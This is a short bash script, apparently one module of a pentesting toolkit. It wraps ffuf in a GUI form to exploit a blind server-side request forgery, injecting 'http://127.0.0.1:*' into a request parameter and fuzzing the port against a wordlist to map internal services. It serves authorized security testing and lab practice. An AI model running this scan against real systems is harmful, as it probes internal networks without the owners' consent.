#!/bin/bash

: '
ffuf: blind ssrf
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
WEBSITE_FIELD=$(form_item "website + path" "website")
CONTENT_TYPE_FIELD=$(form_item "content type" "content_type" "application/x-www-form-urlencoded")
REQUEST_DATA_FIELD=$(form_item "request data (get query string or post date)" "request_data" "dateserver=http://127.0.0.1:*&date=2024-01-01")
FILTER_STRING_FIELD=$(form_item "filter string" "filter_string" "Something went wrong!")

# Generate GUI form
generate_form "${WEBSITE_FIELD}" "${CONTENT_TYPE_FIELD}" "${REQUEST_DATA_FIELD}" "${FILTER_STRING_FIELD}"

WEBSITE=${form_data["website"]}
CONTENT_TYPE=${form_data["content_type"]}
REQUEST_DATA=${form_data["request_data"]/\*/FUZZ}
FILTER_STRING=${form_data["filter_string"]}
WORDLIST="${SCRIPTS_DIR}/web/ffuf/.files/ports.txt"

execute_command "ffuf -w ${WORDLIST}:FUZZ -u '${WEBSITE}' -H 'Content-type: ${CONTENT_TYPE}' -d '${REQUEST_DATA}' -fs '${FILTER_STRING}'"
create_new_line
